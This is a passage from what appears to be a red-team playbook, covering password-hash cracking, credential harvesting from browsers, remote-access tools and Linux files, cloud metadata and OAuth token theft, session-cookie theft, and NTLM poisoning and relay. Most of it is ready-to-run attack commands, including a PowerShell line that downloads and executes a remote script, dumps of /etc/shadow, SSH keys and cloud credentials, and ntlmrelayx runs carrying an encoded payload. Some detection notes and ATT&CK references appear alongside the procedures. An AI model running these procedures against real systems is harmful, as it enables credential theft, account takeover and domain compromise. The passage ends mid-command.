Step 4 - Extended dictionary with dive rule set:
```bash
hashcat -m 1000 \
  $OUTPUT_DIR/ntlm-hashes.txt \
  /opt/wordlists/rockyou.txt \
  /opt/wordlists/kaonashi.txt \
  -r /opt/hashcat/rules/dive.rule \
  -o $OUTPUT_DIR/ntlm-cracked-extended.txt \
  --status
```

**Procedure - NetNTLMv2 Cracking (from Responder):**

Step 1 - Locate Responder capture files:
```bash
ls /opt/Responder/logs/*.txt | grep -i "NTLMv2\|Hash"
# Or find hashcat-ready format files
ls /opt/Responder/logs/*.NTLMV2*
```

Step 2 - Crack NTLMv2 hashes:
```bash
hashcat -m 5600 \
  /opt/Responder/logs/NTLMv2-SSP-$TARGET.txt \
  /opt/wordlists/rockyou.txt \
  -r /opt/hashcat/rules/OneRuleToRuleThemAll.rule \
  -o $OUTPUT_DIR/ntlmv2-cracked.txt \
  --status --status-timer 30
```

**Procedure - Kerberoast Hash Cracking:**

Step 1 - Run Kerberoasting:
```bash
# From Linux (Impacket)
GetUserSPNs.py \
  -dc-ip $DC_IP \
  -request \
  "$DOMAIN/$USERNAME:$PASSWORD" \
  -outputfile $OUTPUT_DIR/kerberoast-hashes.txt

# From Windows (Rubeus)
# Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast-hashes.txt
```

Step 2 - Identify hash type (RC4 vs AES):
```bash
head -1 $OUTPUT_DIR/kerberoast-hashes.txt
# $krb5tgs$23$... -> RC4 (mode 13100) - faster to crack
# $krb5tgs$18$... -> AES256 (mode 19600) - slower to crack
```

Step 3 - Crack Kerberoast hashes:
```bash
# RC4 (more common, faster)
hashcat -m 13100 \
  $OUTPUT_DIR/kerberoast-hashes.txt \
  /opt/wordlists/rockyou.txt \
  -r /opt/hashcat/rules/OneRuleToRuleThemAll.rule \
  -o $OUTPUT_DIR/kerberoast-cracked.txt

# AES256 (less common but increasingly required)
hashcat -m 19600 \
  $OUTPUT_DIR/kerberoast-hashes.txt \
  /opt/wordlists/rockyou.txt \
  -r /opt/hashcat/rules/best64.rule \
  -o $OUTPUT_DIR/kerberoast-aes-cracked.txt
```

**Procedure - AS-REP Roast Hash Cracking:**

Step 1 - Get AS-REP hashes:
```bash
# No credentials needed for accounts without pre-auth
GetNPUsers.py \
  "$DOMAIN/" \
  -dc-ip $DC_IP \
  -request \
  -no-pass \
  -usersfile $OUTPUT_DIR/domain-users.txt \
  -outputfile $OUTPUT_DIR/asrep-hashes.txt
```

Step 2 - Crack AS-REP hashes:
```bash
hashcat -m 18200 \
  $OUTPUT_DIR/asrep-hashes.txt \
  /opt/wordlists/rockyou.txt \
  -r /opt/hashcat/rules/OneRuleToRuleThemAll.rule \
  -o $OUTPUT_DIR/asrep-cracked.txt \
  --status
```

**Wordlist Priority Hierarchy:**

| Priority | Wordlist | Size | Best For |
|---|---|---|---|
| 1 | rockyou.txt | 14M passwords | General, fast first pass |
| 2 | kaonashi.txt | 1.7B passwords | Comprehensive second pass |
| 3 | CeWL custom wordlist | Variable | Target-specific passwords |
| 4 | SecLists passwords | Multiple | Curated by category |
| 5 | CWEL (corporate patterns) | Variable | Enterprise environments |

**Rule Set Priority:**

| Rule | Description | Speed Impact |
|---|---|---|
| OneRuleToRuleThemAll.rule | 52K rules, best coverage | Medium |
| dive.rule | 99K rules, comprehensive | Slow |
| best64.rule | 64 rules, fastest | Minimal |
| d3ad0ne.rule | 35K rules, good balance | Medium |
| T0XlC.rule | 16K rules, targeted | Medium |

**CeWL Custom Wordlist Generation:**

Step 1 - Generate target-specific wordlist from company website:
```bash
cewl \
  -d 3 \
  -m 8 \
  -w $OUTPUT_DIR/cewl-wordlist.txt \
  --with-numbers \
  https://$DOMAIN

# Add common mangling patterns
hashcat --stdout \
  $OUTPUT_DIR/cewl-wordlist.txt \
  -r /opt/hashcat/rules/best64.rule \
  >> $OUTPUT_DIR/cewl-mangled.txt
```

**Detection:** Hash cracking is entirely offline - undetectable by defenders once hashes are exfiltrated. Detection opportunity is at hash capture phase (Kerberoasting generates unusual TGS-REQ traffic, Responder generates poisoned responses detectable by NetSpy/Responder Guard).

**MITRE ATT&CK:** T1110.002 (Password Cracking), T1558.003 (Kerberoasting), T1558.004 (AS-REP Roasting)

---

## Section 5: Credential Harvesting from Applications

### 5.1 LOLApps - Browser Credential Extraction

**Objective:** Extract saved browser credentials from Chrome/Firefox/Edge profile databases without requiring elevated privileges in most cases.

**Prerequisites:** Local user access on Windows target, access to user profile directories

**Tools:**
- `LaZagne` (github.com/AlessandroZ/LaZagne) - All-in-one credential harvester
- `SharpChromium` (github.com/djhohnstein/SharpChromium) - Chrome-specific, C#
- `HackBrowserData` (github.com/moonD4rk/HackBrowserData) - Go binary, multi-browser

**Procedure:**

Step 1 - LaZagne all-in-one extraction (Windows):
```bash
# On compromised Windows host
LaZagne.exe all -oN -output $OUTPUT_DIR\lazagne-output

# Linux equivalent
python3 lazagne.py all -oN
```

Step 2 - SharpChromium for Chrome/Edge:
```bash
# In-memory execution via Cobalt Strike or PowerShell
execute-assembly SharpChromium.exe logins
execute-assembly SharpChromium.exe cookies google.com
execute-assembly SharpChromium.exe history
```

Step 3 - Manual Chrome Login Data extraction (SQLite):
```bash
# Chrome Login Data location
# Windows: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
# Linux: ~/.config/google-chrome/Default/Login Data
# macOS: ~/Library/Application Support/Google/Chrome/Default/Login Data

# Copy (Chrome must be closed or use VSS)
cp "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" \
   $OUTPUT_DIR\chrome-login-data

# Extract on attacker machine
sqlite3 $OUTPUT_DIR/chrome-login-data \
  "SELECT origin_url, username_value, password_value FROM logins;" | \
  tee $OUTPUT_DIR/chrome-encrypted-creds.txt
```

Step 4 - HackBrowserData cross-browser extraction:
```bash
# Single binary, extracts from all supported browsers
./hack-browser-data \
  -b all \
  -format json \
  -output $OUTPUT_DIR/browser-creds
```

**Browser Credential Locations:**

| Browser | Platform | Login Data Location |
|---|---|---|
| Chrome | Windows | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` |
| Chrome | Linux | `~/.config/google-chrome/Default/Login Data` |
| Chrome | macOS | `~/Library/Application Support/Google/Chrome/Default/Login Data` |
| Edge (Chromium) | Windows | `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data` |
| Firefox | Windows | `%APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json` |
| Firefox | Linux | `~/.mozilla/firefox/*.default/logins.json` + `key4.db` |
| Brave | Windows | `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data` |
| Opera | Windows | `%APPDATA%\Opera Software\Opera Stable\Login Data` |

**Detection:** File access to browser profile SQLite databases from non-browser processes. Endpoint DLP tools monitoring `Login Data` file access. Microsoft Defender for Endpoint (MDE) alerts on credential dumping behaviors.

**MITRE ATT&CK:** T1555.003 (Credentials from Web Browsers)

---

### 5.2 Remote Access Tool Credential Extraction (WinSCP, FileZilla, PuTTY)

**Objective:** Extract saved credentials from remote access applications that users commonly configure with persistent credentials to privileged systems.

**Prerequisites:** Local user access on Windows target

**Tools:**
- `LaZagne` (all-in-one, covers all below)
- `SessionGopher` (github.com/Arvanaghi/SessionGopher) - PowerShell, WinSCP/PuTTY/FileZilla
- `WinSCP` registry parser (manual)

**Procedure:**

Step 1 - SessionGopher for WinSCP, PuTTY, FileZilla (PowerShell):
```powershell
# Load and run SessionGopher
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1')
Invoke-SessionGopher -Thorough -AllDomain -o $OUTPUT_DIR\sessiongopher-results.csv

# Local only (no network traversal)
Invoke-SessionGopher -Thorough
```

Step 2 - Manual WinSCP credential extraction from registry:
```powershell
# WinSCP stores sessions in registry
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s > $OUTPUT_DIR\winscp-sessions.txt

# WinSCP Master Password protected - check if empty (common)
# Password field is obfuscated but reversible without master password
```

Step 3 - FileZilla credential extraction:
```bash
# Windows location
cat "$env:APPDATA\FileZilla\recentservers.xml"
cat "$env:APPDATA\FileZilla\sitemanager.xml"

# Linux location
cat ~/.config/filezilla/recentservers.xml
cat ~/.config/filezilla/sitemanager.xml
```

Step 4 - PuTTY session extraction:
```powershell
# PuTTY stores sessions and saved hosts in registry
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s > $OUTPUT_DIR\putty-sessions.txt

# Saved SSH host keys (reveals network topology)
reg query "HKCU\Software\SimonTatham\PuTTY\SshHostKeys" > $OUTPUT_DIR\putty-known-hosts.txt
```

Step 5 - mRemoteNG credential extraction (common in sysadmin environments):
```bash
# mRemoteNG stores credentials in confCons.xml (base64 encoded)
cat "$env:APPDATA\mRemoteNG\confCons.xml"

# Decrypt with mRemoteNG password decryptor
python3 mremoteng_decrypt.py -s "ENCRYPTED_STRING_FROM_XML"
```

**Application Credential Locations:**

| Application | Location | Format | Notes |
|---|---|---|---|
| WinSCP | `HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\*` | Obfuscated registry | Reversible without master password |
| FileZilla | `%APPDATA%\FileZilla\recentservers.xml` | Plaintext XML | No encryption |
| PuTTY | `HKCU\Software\SimonTatham\PuTTY\Sessions\*` | Registry | Creds often not stored |
| mRemoteNG | `%APPDATA%\mRemoteNG\confCons.xml` | Base64 XML | Weak encryption |
| RoyalTS | `*.rtsx` or `*.rtsz` files | AES encrypted | Key in same file |
| MobaXterm | `%APPDATA%\MobaXterm\MobaXterm.ini` | Obfuscated | Reversible |
| TeamViewer | `HKLM\SOFTWARE\WOW6432Node\TeamViewer` | Registry | AES encrypted, static key |
| Slack desktop | `%APPDATA%\Slack\storage\slack-workspaces` | LevelDB | Contains auth tokens |
| Teams | `%APPDATA%\Microsoft\Teams\Cookies` | SQLite | Contains session cookies |

**Detection:** Registry queries to PuTTY/WinSCP keys from non-interactive processes, access to FileZilla XML files from command-line processes. SessionGopher is a known IOC - hash-based detection.

**MITRE ATT&CK:** T1552.001 (Credentials in Files), T1012 (Query Registry), T1555 (Credentials from Password Stores)

---

### 5.3 Linux Credential Files

**Objective:** Extract credentials from standard Linux configuration files, shell history, and SSH key stores on compromised Linux systems.

**Prerequisites:** Local user access (some require root)

**Procedure:**

Step 1 - High-value credential files (root required for shadow):
```bash
# Password hashes
cat /etc/shadow 2>/dev/null | tee $OUTPUT_DIR/etc-shadow.txt
cat /etc/passwd | grep -v "nologin\|false" > $OUTPUT_DIR/interactive-users.txt

# Hash extraction for cracking
grep -v ":\*:\|:!:" /etc/shadow | \
  awk -F: '{print $1":"$2}' > $OUTPUT_DIR/shadow-hashes.txt
```

Step 2 - Shell history files (goldmine for credentials in commands):
```bash
cat ~/.bash_history 2>/dev/null | tee $OUTPUT_DIR/bash-history.txt
cat ~/.zsh_history 2>/dev/null | tee $OUTPUT_DIR/zsh-history.txt

# Find all history files on system
find /home /root -name ".*_history" 2>/dev/null | \
  xargs grep -l "password\|passwd\|--password\|-p " 2>/dev/null

# Extract commands with passwords
grep -E "password|passwd|--pass|-p [A-Za-z]|mysql.*-p|psql.*password" \
  ~/.bash_history 2>/dev/null
```

Step 3 - SSH private key collection:
```bash
# User SSH keys
find /home /root /etc /opt -name "id_rsa" -o -name "id_ed25519" \
  -o -name "*.pem" 2>/dev/null | \
  xargs -I{} bash -c 'echo "=== {} ===" && cat {}' 2>/dev/null | \
  tee $OUTPUT_DIR/ssh-private-keys.txt

# Authorized keys (reveals accepted keys and username hints)
find /home /root -name "authorized_keys" 2>/dev/null | \
  xargs -I{} bash -c 'echo "=== {} ===" && cat {}' 2>/dev/null
```

Step 4 - Cloud provider credentials:
```bash
# AWS credentials
cat ~/.aws/credentials 2>/dev/null
cat ~/.aws/config 2>/dev/null
env | grep -i "aws\|access_key\|secret_key"

# GCP credentials
ls ~/.config/gcloud/credentials.db 2>/dev/null
cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null

# Azure credentials
cat ~/.azure/credentials 2>/dev/null
ls ~/.azure/ 2>/dev/null

# Kubernetes credentials
cat ~/.kube/config 2>/dev/null | grep -A 5 "token:\|password:"
```

Step 5 - Application configuration files:
```bash
# Common config file locations with credentials
find / \( -name "*.conf" -o -name "*.config" -o -name "*.cfg" \
  -o -name "*.env" -o -name ".env" -o -name "wp-config.php" \
  -o -name "database.yml" -o -name "settings.py" \
  -o -name "application.properties" \) 2>/dev/null | \
  xargs grep -l "password\|passwd\|secret\|token\|credential" 2>/dev/null | \
  head -20

# Common database config files
grep -r "password\|passwd" \
  /var/www/html/ /opt/ /srv/ /etc/nginx/ /etc/apache2/ \
  2>/dev/null | grep -v ".pyc\|binary" | head -30
```

Step 6 - Environment variables and process memory:
```bash
# Current session env vars
env | grep -i "pass\|token\|secret\|key\|api" 2>/dev/null

# All running process environments (root required)
for PID in $(ls /proc/ | grep "^[0-9]"); do
  cat /proc/$PID/environ 2>/dev/null | tr '\0' '\n' | \
    grep -i "pass\|token\|secret\|key\|api" && echo "PID: $PID"
done | tee $OUTPUT_DIR/process-env-creds.txt
```

**Detection:** File access to `/etc/shadow` generates audit log entries if auditd configured (rule: `-a exit,always -F path=/etc/shadow`). History file access from unusual processes is anomalous. Cloud credential access triggers CloudTrail (AWS) events if credentials are used.

**MITRE ATT&CK:** T1003.008 (/etc/passwd and /etc/shadow), T1552.001 (Credentials in Files), T1552.004 (Private Keys), T1083 (File and Directory Discovery)

---

## Section 6: Token Theft and Abuse

### 6.1 Cloud IMDS Token Theft (Azure/AWS)

**Objective:** Steal cloud instance identity tokens from the Instance Metadata Service to authenticate as the VM's managed identity/instance role against cloud APIs.

**Prerequisites:** Code execution on cloud VM (EC2, Azure VM, GCP Compute), no network egress restrictions to 169.254.169.254

**Tools:** `curl`, `aws-cli`, `az-cli`, `impacket`, `pacu`, `ROADtools`

**Procedure - AWS EC2 Instance Metadata Token Theft:**

Step 1 - Check for instance role:
```bash
# IMDSv1 (no token required - legacy, still common)
curl -s http://169.254.169.254/latest/meta-data/iam/info

# IMDSv2 (token required - more secure but same attack if you have exec)
TOKEN=$(curl -s -X PUT \
  "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/info
```

Step 2 - Extract temporary credentials:
```bash
# Get role name first
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || \
  curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)

# Get the credentials
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE | \
  jq '{AccessKeyId, SecretAccessKey, Token}' | tee $OUTPUT_DIR/aws-instance-creds.json
```

Step 3 - Use stolen credentials:
```bash
# Export for use
export AWS_ACCESS_KEY_ID=$(cat $OUTPUT_DIR/aws-instance-creds.json | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(cat $OUTPUT_DIR/aws-instance-creds.json | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(cat $OUTPUT_DIR/aws-instance-creds.json | jq -r '.Token')

# Enumerate permissions
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name $ROLE
aws s3 ls
aws ec2 describe-instances --region us-east-1
```

Step 4 - MFA Role Chaining (Praetorian technique - escalate via role chain):
```bash
# If instance role has sts:AssumeRole
aws sts assume-role \
  --role-arn arn:aws:iam::$ACCOUNT_ID:role/$HIGH_PRIV_ROLE \
  --role-session-name athena-pentest \
  | tee $OUTPUT_DIR/assumed-role-creds.json

# Chain to another role if trust policy allows
export AWS_ACCESS_KEY_ID=$(cat $OUTPUT_DIR/assumed-role-creds.json | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(cat $OUTPUT_DIR/assumed-role-creds.json | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(cat $OUTPUT_DIR/assumed-role-creds.json | jq -r '.Credentials.SessionToken')

aws sts assume-role \
  --role-arn arn:aws:iam::$ACCOUNT_ID:role/$ADMIN_ROLE \
  --role-session-name athena-escalated
```

**Procedure - Azure VM Managed Identity Token Theft:**

Step 1 - Check for managed identity:
```bash
# Azure IMDS endpoint
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | \
  jq '{location: .compute.location, resourceGroupName: .compute.resourceGroupName, vmId: .compute.vmId}'
```

Step 2 - Request access token for Azure Resource Manager:
```bash
# Get management token (access Azure RBAC-protected resources)
ARM_TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | \
  jq -r '.access_token')

echo "Token: $ARM_TOKEN" | tee $OUTPUT_DIR/azure-arm-token.txt
```

Step 3 - Get token for Graph API (access Azure AD):
```bash
GRAPH_TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" | \
  jq -r '.access_token')

# Enumerate Azure AD with Graph token
curl -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/organization" | jq '.value[].displayName'
```

Step 4 - Use ARM token for Azure RBAC enumeration:
```bash
# Get subscription ID from IMDS
SUB_ID=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | \
  jq -r '.compute.subscriptionId')

# Check identity's role assignments
curl -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB_ID/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | \
  jq '.value[] | {role: .properties.roleDefinitionId, scope: .properties.scope}'
```

**Detection:** CloudTrail `GetCallerIdentity`, `AssumeRole` events. Azure Activity Logs for token requests. Unusual API calls from instance identity. AWS GuardDuty detects anomalous IMDS access patterns. Azure Security Center alerts on unusual managed identity activity.

**MITRE ATT&CK:** T1552.005 (Cloud Instance Metadata API), T1078.004 (Cloud Accounts), T1548 (Abuse Elevation Control Mechanism - role chaining)

---

### 6.2 Browser Session Cookie Theft

**Objective:** Extract session cookies from browser storage to impersonate authenticated users without needing their credentials, bypassing MFA completely.

**Prerequisites:** Local access to user's machine or browser profile

**Tools:** `SharpChromium`, `CookieMonster`, `SharpCookieMonster`, custom SQLite queries

**Procedure:**

Step 1 - Extract Chrome session cookies:
```bash
# Windows path
CHROME_PROFILE="$env:LOCALAPPDATA\Google\Chrome\User Data\Default"

# Copy Cookies DB (Chrome must be closed, or use VSS for live copy)
cp "$CHROME_PROFILE\Cookies" $OUTPUT_DIR\chrome-cookies.db
cp "$CHROME_PROFILE\Network\Cookies" $OUTPUT_DIR\chrome-cookies-network.db

# SQLite query for high-value cookies
sqlite3 $OUTPUT_DIR/chrome-cookies.db \
  "SELECT host_key, name, encrypted_value, expires_utc FROM cookies
   WHERE host_key LIKE '%.microsoft.com%'
   OR host_key LIKE '%.google.com%'
   OR host_key LIKE '%.okta.com%'
   OR host_key LIKE '%.salesforce.com%'
   ORDER BY expires_utc DESC;" | \
  tee $OUTPUT_DIR/high-value-cookies-raw.txt
```

Step 2 - SharpChromium for decrypted cookies:
```bash
# Via execute-assembly in Cobalt Strike
execute-assembly SharpChromium.exe cookies
execute-assembly SharpChromium.exe cookies microsoft.com
execute-assembly SharpChromium.exe cookies okta.com
```

Step 3 - Slack token extraction (high value - often leads to all internal comms):
```bash
# Slack stores tokens in LevelDB
# Windows: %APPDATA%\Slack\storage\
# Linux: ~/.config/Slack/storage/

ls "$env:APPDATA\Slack\storage\" 2>/dev/null

# Use LevelDB reader or strings extraction
strings "$env:APPDATA\Slack\storage\slack-workspaces" | \
  grep -i "token\|xoxd\|xoxp\|xoxb" | tee $OUTPUT_DIR/slack-tokens.txt
```

**High-Value Cookie Targets:**

| Service | Cookie Name | Access Granted |
|---|---|---|
| Microsoft 365 | `ESTSAUTH`, `ESTSAUTHPERSISTENT` | All M365 services |
| Azure Portal | `esctx`, `x-ms-refreshtokencredential` | Azure management |
| Okta | `sid` | All Okta-federated apps |
| Google Workspace | `GAPS`, `LSID` | Gmail, Drive, GCP |
| AWS Console | `aws-creds`, `AWSALB` | AWS Console access |
| Salesforce | `sid` | CRM access |
| GitHub | `user_session`, `logged_in` | Code repositories |
| Slack | `d` (desktop token) | All Slack comms |

**Detection:** File access to browser Cookie databases from non-browser processes. Chrome CookieMonster hooking by EDR solutions. Microsoft Defender for Identity detects cookie theft via pass-the-cookie attempts.

**MITRE ATT&CK:** T1539 (Steal Web Session Cookie), T1555.003 (Credentials from Web Browsers)

---

### 6.3 OAuth Token Theft

**Objective:** Steal OAuth access and refresh tokens from application configurations, environment variables, and running processes to gain persistent API access.

**Prerequisites:** Access to application server, CI/CD environment, or developer workstation

**Procedure:**

Step 1 - Scan environment for OAuth tokens:
```bash
# Environment variables
env | grep -iE "access_token|oauth_token|bearer|client_secret|refresh_token" | \
  tee $OUTPUT_DIR/oauth-env-tokens.txt

# .env files and application configs
find / -name "*.env" -o -name ".env" -o -name "*.json" \
  -o -name "*.yaml" -o -name "*.yml" 2>/dev/null | \
  xargs grep -l "access_token\|oauth\|bearer\|refresh_token" 2>/dev/null | \
  head -20 | tee $OUTPUT_DIR/oauth-config-files.txt
```

Step 2 - Extract from Docker containers:
```bash
# Inspect container environment variables
docker inspect $CONTAINER_ID | \
  jq '.[].Config.Env[] | select(contains("TOKEN") or contains("SECRET") or contains("KEY"))'

# If inside container
env | grep -iE "token|secret|key|oauth"
```

Step 3 - Extract from CI/CD systems:
```bash
# Jenkins credentials via API (if jenkins admin access obtained)
curl -u $JENKINS_USER:$JENKINS_TOKEN \
  http://$TARGET:8080/credentials/store/system/domain/_/api/json?depth=3 | \
  jq '.credentials[] | {id, description, secret}'

# GitHub Actions secrets (if org admin)
gh secret list --org $ORG_NAME
```

Step 4 - Test stolen OAuth tokens:
```bash
# Test Microsoft/Azure token
curl -H "Authorization: Bearer $STOLEN_TOKEN" \
  "https://graph.microsoft.com/v1.0/me"

# Test Google token
curl -H "Authorization: Bearer $STOLEN_TOKEN" \
  "https://www.googleapis.com/oauth2/v1/userinfo"

# Test GitHub token
curl -H "Authorization: token $STOLEN_TOKEN" \
  "https://api.github.com/user"
```

**Detection:** Token use from unusual IP ranges triggers OAuth provider security alerts. Google, Microsoft, and GitHub all have anomaly detection on token usage. CI/CD systems log API calls.

**MITRE ATT&CK:** T1528 (Steal Application Access Token), T1552 (Unsecured Credentials)

---

## Section 7: NTLM Capture and Relay

### 7.1 Responder - LLMNR/NBT-NS/MDNS Poisoning

**Objective:** Capture NetNTLMv1/v2 hashes from Windows hosts that broadcast authentication requests via legacy name resolution protocols, then crack offline or relay in real-time.

**Prerequisites:** Network position on same broadcast domain as Windows hosts, no LLMNR/NBT-NS hardening deployed

**Tools:**
- `Responder` (github.com/lgandx/Responder) - LLMNR/NBT-NS/MDNS poisoner and hash capturer
- `NTLMParse` (Praetorian) - Analyze NTLM negotiation flags

**Procedure:**

Step 1 - Pre-check: Verify LLMNR is in use on the network:
```bash
# Passive listener mode first (no poisoning, just observe)
responder -I $NETWORK_INTERFACE -A

# Or use Wireshark filter
# udp.port == 5355 (LLMNR)
# udp.port == 137 (NBT-NS)
```

Step 2 - Active poisoning mode (capture hashes):
```bash
# Standard Responder for NTLMv2 capture
responder -I $NETWORK_INTERFACE \
  -rdwv \
  -A   # Remove -A flag to enable active poisoning

# Configure Responder to capture NTLMv1 (more crackable)
# Edit /opt/Responder/Responder.conf
# Challenge = 1122334455667788  (fixed challenge enables NTLMv1 cracking without crack.sh)
responder -I $NETWORK_INTERFACE -rdwv
```

Step 3 - Monitor for captured hashes:
```bash
# Watch logs in real-time
tail -f /opt/Responder/logs/*.txt

# List all captured hashes
ls -lt /opt/Responder/logs/ | grep "NTLMv"

# Unique hashes for cracking
cat /opt/Responder/logs/Responder-Session.log | grep -i "ntlm\|hash"
```

Step 4 - Crack captured hashes immediately:
```bash
# NTLMv2 (most common)
hashcat -m 5600 \
  /opt/Responder/logs/NTLMv2-SSP-$TARGET.txt \
  /opt/wordlists/rockyou.txt \
  -r /opt/hashcat/rules/OneRuleToRuleThemAll.rule

# NTLMv1 (if downgrade succeeded)
hashcat -m 5500 \
  /opt/Responder/logs/NTLMv1-SSP-$TARGET.txt \
  /opt/wordlists/rockyou.txt
```

Step 5 - Simultaneously relay while capturing:
```bash
# Terminal 1: Responder in analysis mode (don't respond - let ntlmrelayx handle it)
# Edit /opt/Responder/Responder.conf: SMB = Off, HTTP = Off
responder -I $NETWORK_INTERFACE -rdwv

# Terminal 2: ntlmrelayx targeting LDAP (most impactful)
ntlmrelayx.py \
  -t ldap://$DC_IP \
  -smb2support \
  --escalate-user $ATTACKER_CONTROLLED_USER \
  -l $OUTPUT_DIR/ldap-relay
```

**Detection:** Windows Event ID 4648 (Logon using explicit credentials - when responding to poisoned LLMNR). Network IDS: Snort rules for LLMNR/NBT-NS poisoning patterns. Microsoft Defender for Identity: "Suspected identity theft using pass-the-hash". Network packet inspection for Responder-specific HTTP/SMB server banners.

**MITRE ATT&CK:** T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay)

---

### 7.2 NTLMRelayx - Multi-Target Relay Attacks

**Objective:** Relay captured NTLM authentication to high-value services (LDAP, SMB, HTTP, ADCS) to authenticate as the victim user without needing their plaintext password.

**Prerequisites:** Man-in-the-middle position (Responder, ARP spoofing, DNS poisoning), targets without SMB Signing (for SMB relay), LDAP without signing enforcement, or HTTP services

**Tools:**
- `ntlmrelayx.py` (Impacket) - Multi-protocol NTLM relay
- `CrackMapExec` - SMB relay verification
- `certipy` - ADCS relay target

**Procedure:**

Step 1 - Pre-check: Identify targets without SMB Signing:
```bash
crackmapexec smb $TARGET_RANGE --gen-relay-list $OUTPUT_DIR/no-smb-signing.txt

# Verify with nmap
nmap -p 445 --script smb-security-mode $TARGET_RANGE | \
  grep -B 3 "message_signing: disabled"
```

Step 2 - SMB relay to command execution:
```bash
# Setup Responder (SMB Off, HTTP Off)
sed -i 's/SMB = On/SMB = Off/' /opt/Responder/Responder.conf
sed -i 's/HTTP = On/HTTP = Off/' /opt/Responder/Responder.conf
responder -I $NETWORK_INTERFACE -rdwv &

# Relay to SMB targets for code execution
ntlmrelayx.py \
  -tf $OUTPUT_DIR/no-smb-signing.txt \
  -smb2support \
  -c "powershell -enc $BASE64_PAYLOAD" \
  | tee $OUTPUT_DIR/relay-smb-results.txt
```

Step 3 - LDAP relay for AD privilege escalation:
```bash
# Relay to LDAP on DC - opens interactive LDAP shell
ntlmrelayx.py \
  -t ldap://$DC_IP \
  -smb2support \
  -i \
  | tee $OUTPUT_DIR/relay-ldap-shell.log &

# Connect to the interactive LDAP shell
nc 127.0.0.1 11000
# In shell: add_user, add_user_to_group, etc.
```

Step 4 - LDAP relay for DCSync rights grant:
```bash
ntlmrelayx.py \
  -t ldap://$DC_IP \
  -smb2support \
  --escalate-user $ATTACKER_CONTROLLED_USER
```

Step 5 - HTTP relay to ADCS (ESC8 - Certificate Enrollment):
```bash
# Enumerate ADCS
certipy find \
  -u "$USERNAME@$DOMAIN" \
  -p $PASSWORD \
  -dc-ip $DC_IP \
  -stdout | grep -A 5 "Web Enrollment"

# Relay to ADCS web enrollment endpoint
ntlmrelayx.py \
  -t "http://$ADCS_SERVER/certsrv/certfnsh.asp" \
  -smb2support \
  --adcs \
  --template "Machine" \
  | tee $OUTPUT_DIR/relay-adcs-results.log
```

Step 6 - WinRM relay (if WinRM accessible without auth requirement):
```bash
ntlmrelayx.py \
  -t $TARGET \
  -smb2support \
  -i  # Interactive mode
```

**Relay Target Priority:**

| Target Type | Relay To | Outcome | Privilege Required |
|---|---|---|---|
| LDAP (no signing) | `ldap://DC_IP` | Modify AD objects, grant DCSync | Any domain user |
| ADCS Web Enrollment | `http://CA/certsrv/` | Get domain cert, Kerberos auth | Any domain user |
| SMB (no signing) | `smb://TARGET` | Code execution as victim | Local admin on target |
| HTTP services | Various | Auth as victim | Varies |
| WinRM | `http://TARGET:5985` | PowerShell remoting | Admin on target |

**Detection:** Event ID 4624 (Logon - Type 3 Network) on relay targets with anomalous source IP. ADCS: Event ID 4886 (Certificate request) from unexpected host. LDAP: Event ID 4662 (AD object access) for DCSync rights modification.

**MITRE ATT&CK:** T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay), T1187 (Forced Authentication)

---

### 7.3 NTLMv1 Downgrade Attack

**Objective:** Force Windows clients to use NTLMv1 instead of NTLMv2 for NTLM challenge/response authentication, producing hashes that are crackable offline without third-party services.

**Prerequisites:** Responder with fixed challenge, target environment using LmCompatibilityLevel 0-2 (default is 3 on modern Windows, but many enterprises are lower for legacy compatibility)

**Tools:**
- `Responder` with fixed challenge configuration
- `NTLMParse` (Praetorian, open-source) - NTLM message analysis

**Procedure:**

Step 1 - Check if environment uses NTLMv1:
```bash
# Passive network capture analysis
tcpdump -i $NETWORK_INTERFACE -w $OUTPUT_DIR/ntlm-capture.pcap \
  'port 445 or port 139 or port 80' &

# Analyze NTLM negotiation with NTLMParse
# (Install: go install github.com/praetorian-inc/NTLMparse@latest)
ntlmparse -f $OUTPUT_DIR/ntlm-capture.pcap
```

Step 2 - Configure Responder for NTLMv1 downgrade:
```bash
# Edit Responder.conf
# Set fixed challenge (enables offline crack without crack.sh)
sed -i 's/Challenge = Random/Challenge = 1122334455667788/' \
  /opt/Responder/Responder.conf

# Verify
grep "Challenge" /opt/Responder/Responder.conf
```

Step 3 - Run Responder with NTLMv1 downgrade enabled:
```bash
responder \
